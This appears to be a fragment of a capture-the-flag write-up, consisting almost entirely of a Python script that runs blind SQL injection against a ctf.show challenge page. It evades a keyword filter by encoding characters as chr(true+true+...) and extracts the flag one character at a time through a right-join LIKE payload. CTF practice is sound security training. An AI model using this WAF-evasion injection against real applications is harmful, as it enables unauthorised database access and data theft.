&lt;img data-src=&#34;\images\article_images\image-20250825000127428.png&#34; alt=&#34;image-20250825000127428&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# -- coding:UTF-8 --
# Author:dota_st + modified
import requests
import time

# ==================== 配置区 ====================
URL = &amp;quot;http://603b48c4-c187-4214-9301-5f6164de0af8.challenge.ctf.show/select-waf.php&amp;quot;

POST_NAME = &amp;quot;tableName&amp;quot;

# 可选字符集
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-&amp;quot;

# 已知 flag 前缀
PREFIX = &amp;quot;ctfshow&amp;#123;&amp;quot;

MAX_LEN = 45
SLEEP_TIME = 0.05

# 服务器响应里判断条件是否成立的关键字
SUCCESS_KEY = &amp;quot;$user_count = 43&amp;quot;

# ==================== 函数区 ====================
def createNum(n):
    s = &amp;#39;true&amp;#39;
    if n == 1:
        return &amp;#39;true&amp;#39;
    for i in range(n - 1):
        s += &amp;quot;+true&amp;quot;
    return s

def change_str(s):
    &amp;quot;&amp;quot;&amp;quot;
    将字符串转换为 chr(x) 拼接形式，用于 SQL concat()
    例如 &amp;#39;abc&amp;#39; -&amp;gt; chr(97),chr(98),chr(99)
    &amp;quot;&amp;quot;&amp;quot;
    res = &amp;quot;chr(&amp;quot; + createNum(ord(s[0])) + &amp;quot;)&amp;quot;
    for c in s[1:]:
        res += &amp;quot;,chr(&amp;quot; + createNum(ord(c)) + &amp;quot;)&amp;quot;
    return res

# ==================== 脚本逻辑 ====================
def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f&amp;quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&amp;#123;change_str(flag + ch + &amp;#39;%&amp;#39;)&amp;#125;))&amp;quot;
            data = &amp;#123;POST_NAME: payload&amp;#125;

            try:
                res = requests.post(URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f&amp;quot;[!] 请求出错: &amp;#123;e&amp;#125;&amp;quot;)
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f&amp;quot;[+] 已发现: &amp;#123;flag&amp;#125;&amp;quot;)
                found = True
                if ch == &amp;quot;&amp;#125;&amp;quot;:
                    print(f&amp;quot;[✓] 最终 flag: &amp;#123;flag&amp;#125;&amp;quot;)
                    return flag
                break

        if not found:
            print(&amp;quot;[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全&amp;quot;)
            break

        time.sleep(SLEEP_TIME)

if __name__ == &amp;quot;__main__&amp;quot;:
    brute_force()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
